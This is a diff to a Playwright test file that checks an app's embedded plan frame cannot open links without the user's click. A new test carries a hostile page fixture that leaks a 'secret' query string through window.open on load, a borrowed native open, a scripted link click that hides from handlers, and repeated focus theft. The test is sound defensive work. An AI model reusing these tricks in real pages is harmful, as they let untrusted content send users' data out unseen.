@@ -124,24 +124,84 @@ for (const [name, wrap] of [
   });
 }
 
-test("a link in a plan, or in its <ia-html>, opens in a new tab rather than in the frame, which can't load it", async () => {
+test("a link in a plan, or in its <ia-html>, opens in a new tab after the user's click in it, rather than in the frame", async () => {
   await withBrowser(server, {}, async (ui) => {
     const { page } = ui;
-    await page.route(/^https:\/\/example\.com\//, (route) => route.fulfill({ contentType: "text/html", body: "elsewhere" }));
+    await page.context().route(/^https:\/\/example\.com\//, (route) => route.fulfill({ contentType: "text/html", body: "elsewhere" }));
     const frame = await openDocument(
       ui,
-      `<h1>Links</h1><p><a id="link" href="https://example.com/plan">a link</a></p><ia-html><template><a id="inner" href="https://example.com/inner" target="_top">inner</a></template></ia-html>`,
+      `<h1>Links</h1><p><a id="link" href="https://example.com/plan">a link</a> <button id="open" onclick="window.open('https://example.com/button')">open</button></p><ia-html><template><a id="inner" href="https://example.com/inner" target="_top">inner</a></template></ia-html>`,
     );
     for (const [where, id, url] of [
       [frame, "#link", "https://example.com/plan"],
+      [frame, "#open", "https://example.com/button"],
       [page.frameLocator("iframe").frameLocator("ia-html iframe"), "#inner", "https://example.com/inner"],
     ]) {
-      const popup = page.waitForEvent("popup", { timeout: 5000 });
+      const opened = page.context().waitForEvent("page", { timeout: 5000 });
       await where.locator(id).click();
-      const tab = await popup;
-      assert.equal(tab.url(), url);
+      const tab = await opened;
+      await tab.waitForURL(url);
       await tab.close();
     }
     assert.equal(frame.url(), "about:srcdoc");
+    assert.equal(await page.getByText("opens a link").count(), 0);
+  });
+});
+
+// The desktop app (Electron) has no popup blocker: a popup the frame opened as it loaded went straight to the browser,
+// with whatever the page put in its URL.
+test("a plan can't open a link without the user's click in it: the board asks instead, also after the frame takes the focus", async () => {
+  await withBrowser(server, { allowErrors: [/allow-popups/] }, async (ui) => {
+    const { page } = ui;
+    const opened = [];
+    page.context().on("page", (p) => opened.push(p.url()));
+    await page.context().route(/^https:\/\/example\.com\//, (route) => route.fulfill({ contentType: "text/html", body: "elsewhere" }));
+    const content = `<h1>Leaky</h1><a id="blank" href="https://example.com/blank?d=secret" target="_blank">blank</a><input id="steal">
+<script>
+  // The browser's window.open (the board's comes after the page's scripts), and a fresh frame's, as it loads.
+  window.open("https://example.com/load?d=secret");
+  const f = document.createElement("iframe");
+  document.body.append(f);
+  try { f.contentWindow.open.call(window, "https://example.com/native?d=secret"); } catch {}
+  // A click of its own on a link, and one the board's handler doesn't see.
+  document.getElementById("blank").addEventListener("click", (e) => e.stopPropagation());
+  document.getElementById("blank").click();
+  // Then it keeps taking the focus and asking the board.
+  setInterval(() => { window.focus(); document.getElementById("steal").focus(); window.open("https://example.com/later?d=secret"); }, 200);
+</script>`;
+    const at = new Date().toISOString();
+    await page.route(new RegExp(`/tasks/${plan.id}/document(\\?.*)?$`), (route) =>
+      route.fulfill({
+        json: {
+          task_type: "plan",
+          file: "plan.html",
+          versions: [{ version: 1, open: false, created_at: at, updated_at: at, size: content.length }],
+          version: 1,
+          content,
+        },
+      }),
+    );
+    await ui.run([`goto /p/${project.id}?task=${plan.id}`, "wait css=iframe"]);
+    // Playwright's queries count as the user's activation (they run as a gesture): let that run out, untouched.
+    await page.waitForTimeout(6500);
+    assert.deepEqual(
+      opened.filter((u) => !u.includes("/later")),
+      [],
+      "the frame opened nothing itself",
+    );
+    opened.length = 0;
+    await page.waitForTimeout(1000);
+    assert.deepEqual(opened, [], "the board opened nothing without the user's input");
+    assert.equal(await page.getByText("opens a link").count(), 0, "nor asked");
+    // The user types in the composer: the frame takes the focus, while the board has the user's activation.
+    await page.getByPlaceholder("Ask for changes to the plan…").click();
+    await page.keyboard.type("hello");
+    await page.waitForTimeout(1000);
+    assert.deepEqual(opened, [], "nothing opened after the user's input in the board");
+    assert.equal(await page.evaluate(() => document.activeElement?.tagName), "IFRAME", "the frame took the focus");
+    // The board asks, showing the link, and opens it only from its own button.
+    await page.getByText("opens a link").waitFor();
+    assert.equal(await page.locator("[role=alert] code").innerText(), "https://example.com/later?d=secret");
+    assert.deepEqual(opened, []);
   });
 });
